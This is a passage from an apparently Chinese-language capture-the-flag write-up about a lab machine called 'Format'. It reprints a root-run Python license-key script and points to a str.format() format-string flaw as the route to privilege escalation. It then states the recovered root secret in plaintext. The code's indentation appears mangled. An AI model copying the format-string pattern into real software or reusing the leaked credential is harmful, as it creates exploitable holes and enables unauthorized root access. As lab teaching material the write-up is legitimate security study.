+if os.geteuid() != 0:
+print(&quot;&quot;)
+print(&quot;Microblog license key manager can only be run as root&quot;)
+print(&quot;&quot;)
+sys.exit()
+
+parser = argparse.ArgumentParser(description=&#39;Microblog license key manager&#39;)
+group = parser.add_mutually_exclusive_group(required=True)
+group.add_argument(&#39;-p&#39;, &#39;--provision&#39;, help=&#39;Provision license key for specified user&#39;, metavar=&#39;username&#39;)
+group.add_argument(&#39;-d&#39;, &#39;--deprovision&#39;, help=&#39;Deprovision license key for specified user&#39;, metavar=&#39;username&#39;)
+group.add_argument(&#39;-c&#39;, &#39;--check&#39;, help=&#39;Check if specified license key is valid&#39;, metavar=&#39;license_key&#39;)
+args = parser.parse_args()
+
+r = redis.Redis(unix_socket_path=&#39;/var/run/redis/redis.sock&#39;)
+
+secret = [line.strip() for line in open(&quot;/root/license/secret&quot;)][0]
+secret_encoded = secret.encode()
+salt = b&#39;microblogsalt123&#39;
+kdf = PBKDF2HMAC(algorithm=hashes.SHA256(),length=32,salt=salt,iterations=100000,backend=default_backend())
+encryption_key = base64.urlsafe_b64encode(kdf.derive(secret_encoded))
+
+f = Fernet(encryption_key)
+l = License()
+
+#provision
+if(args.provision):
+user_profile = r.hgetall(args.provision)
+if not user_profile:
+    print(&quot;&quot;)
+    print(&quot;User does not exist. Please provide valid username.&quot;)
+    print(&quot;&quot;)
+    sys.exit()
+    existing_keys = open(&quot;/root/license/keys&quot;, &quot;r&quot;)
+    all_keys = existing_keys.readlines()
+for user_key in all_keys:
+if(user_key.split(&quot;:&quot;)[0] == args.provision):
+print(&quot;&quot;)
+print(&quot;License key has already been provisioned for this user&quot;)
+print(&quot;&quot;)
+sys.exit()
+prefix = &quot;microblog&quot;
+username = r.hget(args.provision, &quot;username&quot;).decode()
+firstlast = r.hget(args.provision, &quot;first-name&quot;).decode() + r.hget(args.provision, &quot;last-name&quot;).decode()
+license_key = (prefix + username + &quot;{license.license}&quot; + firstlast).format(license=l)
+print(&quot;&quot;)
+print(&quot;Plaintext license key:&quot;)
+print(&quot;------------------------------------------------------&quot;)
+print(license_key)
+print(&quot;&quot;)
+license_key_encoded = license_key.encode()
+license_key_encrypted = f.encrypt(license_key_encoded)
+print(&quot;Encrypted license key (distribute to customer):&quot;)
+print(&quot;------------------------------------------------------&quot;)
+print(license_key_encrypted.decode())
+print(&quot;&quot;)
+with open(&quot;/root/license/keys&quot;, &quot;a&quot;) as license_keys_file:
+license_keys_file.write(args.provision + &quot;:&quot; + license_key_encrypted.decode() + &quot;\n&quot;)
+
+#deprovision
+if(args.deprovision):
+print(&quot;&quot;)
+print(&quot;License key deprovisioning coming soon&quot;)
+print(&quot;&quot;)
+sys.exit()
+
+#check
+if(args.check):
+print(&quot;&quot;)
+try:
+license_key_decrypted = f.decrypt(args.check.encode())
+print(&quot;License key valid! Decrypted value:&quot;)
+print(&quot;------------------------------------------------------&quot;)
+print(license_key_decrypted.decode())
+except:
+print(&quot;License key invalid&quot;)
+print(&quot;&quot;)
+</code></pre>
+<pre><code class="python">license_key = (prefix + username + &quot;{license.license}&quot; + firstlast).format(license=l)
+</code></pre>
+<p>最重要的就是这一行，使用了format</p>
+<p>这里存在format格式化字符串漏洞，这也是本靶机名字的来源<br>Refer:<br><a href="https://podalirius.net/en/articles/python-format-string-vulnerabilities/" target="_blank" rel="noopener">https://podalirius.net/en/articles/python-format-string-vulnerabilities/</a><br><a href="https://lucumr.pocoo.org/2016/12/29/careful-with-str-format/" target="_blank" rel="noopener">https://lucumr.pocoo.org/2016/12/29/careful-with-str-format/</a></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2023/png/33561677/1687604711518-a70bc530-a8bf-443c-9e70-b9579f594c4a.png#averageHue=%23caaf77&clientId=u3df09d10-6dd0-4&from=paste&height=697&id=u8cc861db&originHeight=871&originWidth=1897&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=49717&status=done&style=none&taskId=u1f352b1b-8b76-46ed-a4e6-94e670e6d98&title=&width=1517.6" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2023/png/33561677/1687604880427-2af1387e-e9be-4382-9db6-e4ffb83f2ab9.png#averageHue=%231e1c1c&clientId=u3df09d10-6dd0-4&from=paste&height=802&id=u168e3646&originHeight=1003&originWidth=1913&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=293034&status=done&style=none&taskId=u713dabce-a940-4546-8489-2f135c930bd&title=&width=1530.4" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2023/png/33561677/1687604998826-2dda9814-8cc9-47b7-a034-281c9bcba408.png#averageHue=%23262525&clientId=u3df09d10-6dd0-4&from=paste&height=407&id=u214927eb&originHeight=509&originWidth=1917&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=155537&status=done&style=none&taskId=uf59e7ae6-b0dc-4989-9759-b8dda5f9c2b&title=&width=1533.6" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<p>其中密码是secret:unCR4ckaBL3Pa$$w0rd<br>尝试切换root成功</p>
+
+        </div>
+
+        <blockquote class="post-copyright">
+    
+    <div class="content">
+        
+<span class="post-time">
+    Last updated: <time datetime="2023-06-25T16:12:05.418Z" itemprop="dateUpdated">2023-06-26 00:12:05</time>
+</span><br>
+
+
+        
+        IF the blog help you a lot ,Buy me a cup of coffee~：<a href="/2023/06/26/Format/" target="_blank" rel="external">someb0dy.github.io/2023/06/26/Format/</a>
+        
+    </div>
+    
+    <footer>
+        <a href="someb0dy.github.io">
+            <img src="/img/avatar.jpg" alt="Someb0dy">
+            Someb0dy
+        </a>
+    </footer>
+</blockquote>
+
+        
+<div class="page-reward">
+    <a id="rewardBtn" href="javascript:;" target="_blank" rel="noopener" class="page-reward-btn waves-effect waves-circle waves-light">赏</a>
+</div>
+
+
+
+        <div class="post-footer">
+            
+	<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Redis-NginxMisconfigure/" rel="tag">Redis,NginxMisconfigure</a></li></ul>
+
+
+            
+<div class="page-share-wrap">
+    
+
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=someb0dy.github.io/2023/06/26/Format/&title=《Format》 — Someb0dy's blog&pic=someb0dy.github.io/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" target="_blank" rel="noopener" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=someb0dy.github.io/2023/06/26/Format/&title=《Format》 — Someb0dy's blog&source=Always Be Hungry,Be Foolish" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=someb0dy.github.io/2023/06/26/Format/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《Format》 — Someb0dy's blog&url=someb0dy.github.io/2023/06/26/Format/&via=someb0dy.github.io" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=someb0dy.github.io/2023/06/26/Format/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+
+    <a href="javascript:;" target="_blank" rel="noopener" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
+    </a>
+</div>
+
+
+
+        </div>
+    </div>
+
+    
+<nav class="post-nav flex-row flex-justify-between">
+  
+    <div class="waves-block waves-effect prev">
+      <a href="/2023/06/26/Squashed/" id="post-prev" class="post-nav-link">
+        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
+        <h4 class="title">Squashed</h4>
+      </a>
+    </div>
+  
+
+  
+    <div class="waves-block waves-effect next">
+      <a href="/2023/06/26/SandWorm/" id="post-next" class="post-nav-link">
+        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
+        <h4 class="title">SandWorm</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
+
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</article>
+
+<div id="reward" class="page-modal reward-lay">
+    <a class="close" href="javascript:;" target="_blank" rel="noopener"><i class="icon icon-close"></i></a>
+    <h3 class="reward-title">
+        <i class="icon icon-quote-left"></i>
+        IF My blog Help you A lot Please Buy me a coffee~
+        <i class="icon icon-quote-right"></i>
+    </h3>
+    <div class="reward-content">
+        
+        <div class="reward-code">
+            <img id="rewardCode" src="/img/wechat.png" alt="打赏二维码">
+        </div>
+        
+        <label class="reward-toggle">
+            <input id="rewardToggle" type="checkbox" class="reward-toggle-check"
+                data-wechat="/img/wechat.png" data-alipay="/img/ali.png">
+            <div class="reward-toggle-ctrol">
+                <span class="reward-toggle-item wechat">微信</span>
+                <span class="reward-toggle-label"></span>
+                <span class="reward-toggle-item alipay">支付宝</span>
+            </div>
+        </label>
+        
+    </div>
+</div>
+
+
+
+</div>
+
+        <footer class="footer">
+    <div class="top">
+        
+<p>
+    <span id="busuanzi_container_site_uv" style='display:none'>
+        站点总访客数：<span id="busuanzi_value_site_uv"></span>
+    </span>
+    <span id="busuanzi_container_site_pv" style='display:none'>
+        站点总访问量：<span id="busuanzi_value_site_pv"></span>
+    </span>
+</p>
+
+
+        <p>
+            
+            <span>This blog is licensed under a <a rel="license noopener" href="https://creativecommons.org/licenses/by/4.0/" target="_blank">Creative Commons Attribution 4.0 International License</a>.</span>
+        </p>
+    </div>
+    <div class="bottom">
+        <p><span>Someb0dy &copy; 2015 - 2023</span>
+            <span>
+                
+                Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/yscoder/hexo-theme-indigo" target="_blank">indigo</a>
+            </span>
+        </p>
+    </div>
+</footer>
+
+    </main>
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" target="_blank" rel="noopener" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+
+
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=someb0dy.github.io/2023/06/26/Format/&title=《Format》 — Someb0dy's blog&pic=someb0dy.github.io/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" target="_blank" rel="noopener" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=someb0dy.github.io/2023/06/26/Format/&title=《Format》 — Someb0dy's blog&source=Always Be Hungry,Be Foolish" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=someb0dy.github.io/2023/06/26/Format/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《Format》 — Someb0dy's blog&url=someb0dy.github.io/2023/06/26/Format/&via=someb0dy.github.io" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=someb0dy.github.io/2023/06/26/Format/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;" target="_blank" rel="noopener"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAK4AAACuCAAAAACKZ2kyAAABw0lEQVR42u3aQW6EMAwFUO5/aSp1VakFvmPwIPV5NZpB4WUWVmJ72+LYv+P35/yZ/Uecr3ND4OLitrn7aRy9LKEfrZD/+sf6uLi4g9xO8jp68nzD1eSIi4v7Tm7yyvOUh4uL+x+4/e3h4uK+mZtcTqpFkKSm8eBdDRcXt8HtFEzv+jxU38XFxW13JZLI1+y/ERcXd4bbL20k15XzdfKiKi4u7gx3rVmSnEBybvLH4eLiznPX8t9aUqsmPlxc3E9xO+2QvIF6Q6MFFxd3kJu3LvISydr2LraEi4s7zk0SWWFIolgoid6Ii4s7zr3rotJJWxeXK1xc3HFuta3y9AqHPR9cXNyHudXGSfJ9nrCS5usFHRcX9wFutRSSD1clW8q55e4NLi5ug7uWkjpljs5ABi4u7gw3b3ZW26jVg1E0KIaLizvCrR5B7roObUHg4uJ+irsXo1zQvPfYhIuLO8LNI0lG1SGtfE1cXNx5bjV5JU/m2ygPfeLi4g5y8+tQguvkzotWCi4u7iu5yQbWxiwKVV5cXNzXcNeOO9U2TKGyi4uL+zC3c/lJjjhrY1sX02S4uLiPcdcKpmuFknwzi1BcXNwu9wsQw7R7Ycp/SQAAAABJRU5ErkJggg==" alt="微信分享二维码">
+</div>
+
+
+
+
+    <script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+<script>
+var BLOG = { ROOT: '/', SHARE: true, REWARD: true };
+
+
+</script>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/main.min.js"></script>
+
+
+<div class="search-panel" id="search-panel">
+    <ul class="search-result" id="search-result"></ul>
+</div>
+<template id="search-tpl">
+<li class="item">
+    <a href="{path}" class="waves-block waves-effect">
+        <div class="title ellipsis" title="{title}">{title}</div>
+        <div class="flex-row flex-middle">
+            <div class="tags ellipsis">
+                {tags}
+            </div>
+            <time class="flex-col time">{date}</time>
+        </div>
+    </a>
+</li>
+</template>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/search.min.js" async></script>
+
+
+
+
+
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+<script>
+(function() {
+    var OriginTitile = document.title, titleTime;
+    document.addEventListener('visibilitychange', function() {
+        if (document.hidden) {
+            document.title = '不想看就别看了！';
+            clearTimeout(titleTime);
+        } else {
+            document.title = '你还敢回来！';
+            titleTime = setTimeout(function() {
+                document.title = OriginTitile;
+            },2000);
+        }
+    });
+})();
+</script>
+
+
+
+</body>
+</html>
